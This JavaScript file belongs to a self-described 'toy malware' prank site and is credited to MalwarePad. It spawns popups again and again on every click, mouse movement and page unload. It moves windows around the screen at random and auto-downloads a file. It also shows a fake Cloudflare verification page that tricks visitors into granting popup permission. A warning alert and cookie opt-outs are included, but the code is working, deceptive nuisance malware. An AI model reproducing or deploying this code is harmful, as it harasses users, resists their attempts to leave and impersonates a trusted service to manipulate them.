/*
Huge thanks to MalwarePad (https://malwarepad.com) for the majority of the code!
*/

if (top.location != location) {
  top.location.href = location.href;
}

function openWhite() {
  window.open(
    "popup-white.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function openBlack() {
  window.open(
    "popup-black.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function reopen() {
  const functions = [openWhite, openBlack];
  const random = Math.floor(Math.random() * functions.length);
  functions[random]();
}

function spam() {
  for (var i = 0; i < 3; i++) {
    reopen();
  }
}

function init() {
  if (checkCookie()) {
    return;
  }

  document.body.onclick = reopen;
  document.body.onmouseover = reopen;
  document.body.onmousemove = reopen;
  window.onbeforeunload = spam;
  playBall();
  reopen();
}

var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100;

function playBall() {
  xPos = Math.ceil(Math.random() * screen.width);
  yPos = Math.ceil(Math.random() * screen.height);

  window.moveTo(xPos, yPos);
  setTimeout(playBall, 3);
}

function addCookie() {
  document.cookie = "antiomv=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/";
  localStorage.setItem("antiomv", "true");
}

function addCookie2() {
  document.cookie = "fullomv=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/";
  localStorage.setItem("fullomv", "true");
  window.location.href = "about:blank";
}

function checkCookie() {
  const cookies = document.cookie.split('; ').reduce((acc, cur) => {
    const [key, val] = cur.split('=');
    acc[key] = val;
    return acc;
  }, {});

  const localStorageData = Object.keys(localStorage).reduce((acc, key) => {
    acc[key] = localStorage.getItem(key);
      return acc;
  }, {});

  if (cookies["antiomv"] === "true" || localStorageData["antiomv"] === "true") { 
    if (window.location.pathname === "/popup-white.html" || window.location.pathname === "/popup-black.html") {
      window.location.href = "about:blank";
      window.close();
    } else {
      window.location.href = "./antivirus.html";
    }

    return true;
  }

  return false;
}

function checkCookie2() {
  const cookies = document.cookie.split('; ').reduce((acc, cur) => {
    const [key, val] = cur.split('=');
    acc[key] = val;
    return acc;
  }, {});

  const localStorageData = Object.keys(localStorage).reduce((acc, key) => {
    acc[key] = localStorage.getItem(key);
      return acc;
  }, {});

  if ((cookies["directomv"] !== "true" && localStorageData["directomv"] !== "true") || (!cookies["directomv"] && !localStorageData["directomv"])) { 
    alert("NOTICE: \n This website contains toy malaware. It uses a fake Cloudflare verification page to gain popup permissions. Following the instructions will lead you to a website that will spam open popups with flashing images and text. It will also autoplay an audio in the backgroud. The popups will bounce around the screen and replicate. This malaware will not automatically stop. Please visit at your own risk.");
  }
  
  document.cookie = "directomv=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
  localStorage.removeItem("directomv");
}

function autoDownload() {
  async function downloadFile(url, filename) {
    const response = await fetch(url);

    const blob = await response.blob();
    const blobUrl = URL.createObjectURL(blob);

    const anchor = document.createElement('a');
    anchor.href = blobUrl;
    anchor.download = filename;
    anchor.style.display = 'none';
    document.body.appendChild(anchor);
    anchor.click();
    document.body.removeChild(anchor);

    URL.revokeObjectURL(blobUrl);
  }

  downloadFile("./assets/other/omv_remover.html", "omv_remover.html");
}

function popupPrompt() {
  if (checkCookie()) {
    window.location.href = "./antivirus.html";
  }

  const popups = [];

  for (let i = 0; i < 3; i++) {
    const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
    popups.push(popup);
  }

  const blocked = popups.some(popup => popup === null || typeof popup === "undefined");

  if (blocked) {
    popups.forEach(popup => {
      if (popup && !popup.closed) popup.close();
    });

    setTimeout(function () {
      const changeElement = document.getElementById("change");
      if (changeElement) {
        changeElement.textContent = "Verifying...";
      }
    }, 300);

    setTimeout(function () {
      const changeElement = document.getElementById("change");
      const changeElement2 = document.getElementById("cloudflaremsg");
      if (changeElement) {
        changeElement.textContent = "Enable popups to continue.";
      }
      if (changeElement2) {
        changeElement2.style.display = "block";
      }
    }, 2000);
  } else {
    popups.forEach(popup => popup.close());
    window.location.href = "./virus.html";
  }
}